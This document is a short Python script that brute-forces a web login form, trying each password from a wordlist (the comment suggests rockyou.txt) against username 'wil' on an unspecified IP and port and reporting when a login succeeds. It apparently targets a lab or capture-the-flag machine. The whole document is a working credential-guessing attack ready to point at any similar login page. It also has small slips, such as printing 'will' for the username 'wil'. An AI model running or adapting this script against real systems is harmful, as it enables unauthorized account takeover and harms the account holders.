import requests

error_message = "images/WrongAnswer.gif"

try:
    with open("passwordlist.txt", 'r') as f: # Note!: You need to create a passwordlist.txt file with a list of passwords. We recommend using the rockyou.txt file from github
        for password in f:
            url = f"http://{IP}:{PORT}/index.php?page=signin&username=wil&password={password.strip()}&Login=Login"
            try:
                req = requests.get(url)
                if error_message not in req.text:
                    print(f"CREDENTIAL FOUND! will:{password.strip()}")
                    exit()
                else:
                    print(f"WRONG: {password.strip()}")
            except Exception as e:
                print(str(e))
    f.close()
except:
    print("Error")

print("Scan Complete")